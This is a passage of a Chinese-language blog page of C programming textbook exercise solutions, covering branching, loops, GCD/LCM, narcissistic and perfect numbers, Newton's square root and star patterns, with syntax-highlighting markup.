class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// （1）判断哪个等级方法（2）60一下输出E</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123; <span class="keyword">float</span> score;</span><br><span class="line">    <span class="keyword">char</span> grade;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入学生成绩:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%f"</span>,&amp;score);</span><br><span class="line">    <span class="keyword">while</span> (score&gt;<span class="number">100</span>||score&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">"\n 输入有误,请重输"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%f"</span>,&amp;score);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span>((<span class="keyword">int</span>)(score/<span class="number">10</span>))</span><br><span class="line">       &#123;<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>: grade=<span class="string">'A'</span>;<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>: grade=<span class="string">'B'</span>;<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>: grade=<span class="string">'C'</span>;<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>: grade=<span class="string">'D'</span>;<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: grade=<span class="string">'E'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"成绩是 %5.1f,相应的等级是%c\n "</span>,score,grade);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200223145319.png" alt></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;math.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> num,indiv,ten,hundred,thousand,ten_thousand,place;      <span class="regexp">//</span>分别代表个位,十位,百位,千位,万位和位数 </span><br><span class="line">  <span class="keyword">printf</span>(<span class="string">"请输入一个整数(0-99999):"</span>);</span><br><span class="line">  scanf(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">  <span class="keyword">if</span> (num&gt;<span class="number">9999</span>)</span><br><span class="line">       place=<span class="number">5</span>;</span><br><span class="line">  <span class="keyword">else</span>  <span class="keyword">if</span> (num&gt;<span class="number">999</span>)</span><br><span class="line">       place=<span class="number">4</span>;</span><br><span class="line">  <span class="keyword">else</span>  <span class="keyword">if</span> (num&gt;<span class="number">99</span>)</span><br><span class="line">       place=<span class="number">3</span>;</span><br><span class="line">  <span class="keyword">else</span>  <span class="keyword">if</span> (num&gt;<span class="number">9</span>)</span><br><span class="line">       place=<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">else</span> place=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">printf</span>(<span class="string">"位数:%d\n"</span>,place);</span><br><span class="line">  <span class="keyword">printf</span>(<span class="string">"每位数字为:"</span>);</span><br><span class="line">  ten_thousand=num/<span class="number">10000</span>;</span><br><span class="line">  thousand=(<span class="keyword">int</span>)(num-ten_thousand*<span class="number">10000</span>)/<span class="number">1000</span>;</span><br><span class="line">  hundred=(<span class="keyword">int</span>)(num-ten_thousand*<span class="number">10000</span>-thousand*<span class="number">1000</span>)/<span class="number">100</span>;</span><br><span class="line">  ten=(<span class="keyword">int</span>)(num-ten_thousand*<span class="number">10000</span>-thousand*<span class="number">1000</span>-hundred*<span class="number">100</span>)/<span class="number">10</span>;</span><br><span class="line">  indiv=(<span class="keyword">int</span>)(num-ten_thousand*<span class="number">10000</span>-thousand*<span class="number">1000</span>-hundred*<span class="number">100</span>-ten*<span class="number">10</span>);</span><br><span class="line">  switch(place)</span><br><span class="line">    &#123;case <span class="number">5</span>:<span class="keyword">printf</span>(<span class="string">"%d,%d,%d,%d,%d"</span>,ten_thousand,thousand,hundred,ten,indiv);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"\n反序数字为:"</span>);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"%d%d%d%d%d\n"</span>,indiv,ten,hundred,thousand,ten_thousand);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     case <span class="number">4</span>:<span class="keyword">printf</span>(<span class="string">"%d,%d,%d,%d"</span>,thousand,hundred,ten,indiv);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"\n反序数字为:"</span>);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"%d%d%d%d\n"</span>,indiv,ten,hundred,thousand);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     case <span class="number">3</span>:<span class="keyword">printf</span>(<span class="string">"%d,%d,%d"</span>,hundred,ten,indiv);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"\n反序数字为:"</span>);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"%d%d%d\n"</span>,indiv,ten,hundred);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     case <span class="number">2</span>:<span class="keyword">printf</span>(<span class="string">"%d,%d"</span>,ten,indiv);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"\n反序数字为:"</span>);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"%d%d\n"</span>,indiv,ten);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     case <span class="number">1</span>:<span class="keyword">printf</span>(<span class="string">"%d"</span>,indiv);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"\n反序数字为:"</span>);</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"%d\n"</span>,indiv);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200223151401.png" alt><br>顺序排序</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line"> &#123;<span class="keyword">int</span>  t,a,b,c,d;</span><br><span class="line">  <span class="keyword">printf</span>(<span class="string">"请输入四个数:"</span>);</span><br><span class="line">  scanf(<span class="string">"%d,%d,%d,%d"</span>,&amp;a,&amp;b,&amp;c,&amp;d);</span><br><span class="line">  <span class="keyword">printf</span>(<span class="string">"a=%d,b=%d,c=%d,d=%d\n"</span>,a,b,c,d);</span><br><span class="line">  <span class="keyword">if</span> (a&gt;b)</span><br><span class="line">    &#123; t=a;a=b;b=t;&#125;</span><br><span class="line">  <span class="keyword">if</span> (a&gt;c)</span><br><span class="line">    &#123; t=a;a=c;c=t;&#125;</span><br><span class="line">  <span class="keyword">if</span> (a&gt;d)</span><br><span class="line">    &#123; t=a;a=d;d=t;&#125;</span><br><span class="line">  <span class="keyword">if</span> (b&gt;c)</span><br><span class="line">    &#123; t=b;b=c;c=t;&#125;</span><br><span class="line">  <span class="keyword">if</span> (b&gt;d)</span><br><span class="line">    &#123; t=b;b=d;d=t;&#125;</span><br><span class="line">  <span class="keyword">if</span> (c&gt;d)</span><br><span class="line">    &#123; t=c;c=d;d=t;&#125;</span><br><span class="line">  <span class="keyword">printf</span>(<span class="string">"排序结果如下: \n"</span>);</span><br><span class="line">  <span class="keyword">printf</span>(<span class="string">"%d  %d  %d  %d  \n"</span>   ,a,b,c,d);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="6-循环结构程序设计"><a href="#6-循环结构程序设计" class="headerlink" title="6 循环结构程序设计"></a>6 循环结构程序设计</h2><h3 id="6-1-while-实现循环"><a href="#6-1-while-实现循环" class="headerlink" title="6.1 while 实现循环"></a>6.1 while 实现循环</h3><p>当型循环</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="built_in">i</span>&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">    sum=sum+<span class="built_in">i</span>;</span><br><span class="line">    <span class="built_in">i</span>++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-2-do……while-实现循环"><a href="#6-2-do……while-实现循环" class="headerlink" title="6.2 do……while 实现循环"></a>6.2 do……while 实现循环</h3><p>直到型循环</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">printf</span>(<span class="string">"%d"</span>, i++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(i&lt;=<span class="number">100</span>);</span><br></pre></td></tr></table></figure><h3 id="6-3-for-实现循环"><a href="#6-3-for-实现循环" class="headerlink" title="6.3 for 实现循环"></a>6.3 for 实现循环</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="built_in">i</span>=<span class="number">1</span>;<span class="built_in">i</span>&lt;=<span class="number">100</span>;<span class="built_in">i</span>++)&#123;</span><br><span class="line">    printf(<span class="string">"%d"</span>, <span class="built_in">i</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-4-习题（第五章）"><a href="#6-4-习题（第五章）" class="headerlink" title="6.4 习题（第五章）"></a>6.4 习题（第五章）</h3><p>==重点==<br><img src="/2020/01/26/C_C++_01/20200225144703.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 求解最小公倍数和最大公约数</span></span><br><span class="line"><span class="comment">// 求最大公约数: 辗转相除法(欧几里得算法)</span></span><br><span class="line"><span class="comment">// 两数乘积等于最大公约数与最小公倍数的乘积</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n,temp,r,p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入两个正整数 m,n:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;m, &amp;n);</span><br><span class="line">    <span class="keyword">if</span>(m&lt;n)&#123;</span><br><span class="line">        temp=m;</span><br><span class="line">        m=n;</span><br><span class="line">        n=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    p=m*n;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)&#123;</span><br><span class="line">        r=m%n;</span><br><span class="line">        m=n;</span><br><span class="line">        n=r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"最大公约数是: %d\n"</span>, m);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"最小公倍数是: %d\n"</span>, p/m);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200225151105.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if((c=getchar())!='\n')</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> c;</span><br><span class="line">  <span class="keyword">int</span> letters=<span class="number">0</span>,space=<span class="number">0</span>,digit=<span class="number">0</span>,other=<span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"请输入一行字符:\n"</span>);</span><br><span class="line">  <span class="keyword">while</span>((c=getchar())!=<span class="string">'\n'</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (c&gt;=<span class="string">'a'</span> &amp;&amp; c&lt;=<span class="string">'z'</span> || c&gt;=<span class="string">'A'</span> &amp;&amp; c&lt;=<span class="string">'Z'</span>)</span><br><span class="line">        letters++;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="string">' '</span>)</span><br><span class="line">        space++;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (c&gt;=<span class="string">'0'</span> &amp;&amp; c&lt;=<span class="string">'9'</span>)</span><br><span class="line">        digit++;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        other++;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"字母数:%d\n空格数:%d\n数字数:%d\n其它字符数:%d\n"</span>,letters,space,digit,other);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200225152427.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意an的求法</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,n,i=<span class="number">1</span>,result=<span class="number">0</span>,an=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a,n:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d,%d"</span>,&amp;a,&amp;n);</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        an=an+a;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,an);</span><br><span class="line">        result=result+an;</span><br><span class="line">        a=a*<span class="number">10</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a+aa+aaa+ …=%d\n"</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200225153913.png" alt></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line"></span><br><span class="line"> &#123;double s=<span class="number">0</span>,<span class="built_in">t</span>=<span class="number">1</span>;</span><br><span class="line">  <span class="built_in">int</span> <span class="built_in">n</span>;</span><br><span class="line">  for (<span class="built_in">n</span>=<span class="number">1</span>;<span class="built_in">n</span>&lt;=<span class="number">20</span>;<span class="built_in">n</span>++)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">t</span>=<span class="built_in">t</span>*<span class="built_in">n</span>;</span><br><span class="line">   s=s+<span class="built_in">t</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(<span class="string">"1!+2!+...+20!=%22.15e\n"</span>,s);</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==重点==<br><img src="/2020/01/26/C_C++_01/20200225155427.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//水仙花数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,ge,shi,bai;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">100</span>;i&lt;<span class="number">1000</span>;i++)&#123;</span><br><span class="line">        ge=i%<span class="number">10</span>;</span><br><span class="line">        shi=(i%<span class="number">100</span>)/<span class="number">10</span>;</span><br><span class="line">        bai=i/<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">if</span>(i==(<span class="built_in">pow</span>(ge,<span class="number">3</span>)+<span class="built_in">pow</span>(shi,<span class="number">3</span>)+<span class="built_in">pow</span>(bai,<span class="number">3</span>)))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200225155836.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//100以内的完数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;<span class="keyword">int</span> m,s,i;</span><br><span class="line">  <span class="keyword">for</span> (m=<span class="number">2</span>;m&lt;<span class="number">1000</span>;m++)</span><br><span class="line">    &#123;s=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;m;i++)</span><br><span class="line">       <span class="keyword">if</span> ((m%i)==<span class="number">0</span>) s=s+i;</span><br><span class="line">     <span class="keyword">if</span>(s==m)</span><br><span class="line">      &#123;<span class="built_in">printf</span>(<span class="string">"%d,its factors are "</span>,m);</span><br><span class="line">       <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;m;i++)</span><br><span class="line">     <span class="keyword">if</span> (m%i==<span class="number">0</span>)  <span class="built_in">printf</span>(<span class="string">"%d "</span>,i);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200226131957.png" alt></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//斐波那契数列变形</span></span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="built_in">int</span> i,n=<span class="number">20</span>;</span><br><span class="line">  <span class="built_in">double</span> a=<span class="number">2</span>,b=<span class="number">1</span>,s=<span class="number">0</span>,t;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">   &#123;</span><br><span class="line">   s=s+a/b;</span><br><span class="line">   t=a,</span><br><span class="line">   a=a+b,</span><br><span class="line">   b=t;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(<span class="string">"sum=%16.10f\n"</span>,s);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200226135057.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//牛顿迭代法求平方根</span></span><br><span class="line"><span class="comment">//初值x0=a/2</span></span><br><span class="line"><span class="comment">//注意do……while循环while的条件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  <span class="keyword">float</span> a,x0,x1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"enter a positive number:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%f"</span>,&amp;a);</span><br><span class="line">  x0=a/<span class="number">2</span>;</span><br><span class="line">  x1=(x0+a/x0)/<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">   &#123;x0=x1;</span><br><span class="line">    x1=(x0+a/x0)/<span class="number">2</span>;</span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="built_in">fabs</span>(x0-x1)&gt;=<span class="number">1e-5</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The square root of %5.2f  is %8.5f\n"</span>,a,x1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>==重点==<br><img src="/2020/01/26/C_C++_01/20200226135901.png" alt></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//图形输出问题</span></span><br><span class="line"><span class="comment">//分成两部分来看，找每一行空格,*和行号的规律</span></span><br><span class="line"><span class="comment">//注意输出一行后记得输出\n</span></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  int i,j,k;</span><br><span class="line">  for(k=<span class="number">1</span>;k&lt;=<span class="number">4</span>;k++)&#123;</span><br><span class="line">    for(i=<span class="number">1</span>;i&lt;=<span class="number">4</span>-k;i++)&#123;</span><br><span class="line">        printf(<span class="string">" "</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    for(j=<span class="number">1</span>;j&lt;=<span class="number">2</span>*k<span class="number">-1</span>;j++)&#123;</span><br><span class="line">        printf(<span class="string">"*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  for(k=<span class="number">1</span>;k&lt;=<span class="number">3</span>;k++)&#123;</span><br><span class="line">    for(i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line">        printf(<span class="string">" "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    for(j=<span class="number">1</span>;j&lt;=<span class="number">2</span>*(<span class="number">3</span>-k)+<span class="number">1</span>;j++)&#123;</span><br><span class="line">        printf(<span class="string">"*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200226141938.png" alt><br><img src="/2020/01/26/C_C++_01/20200226142429.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 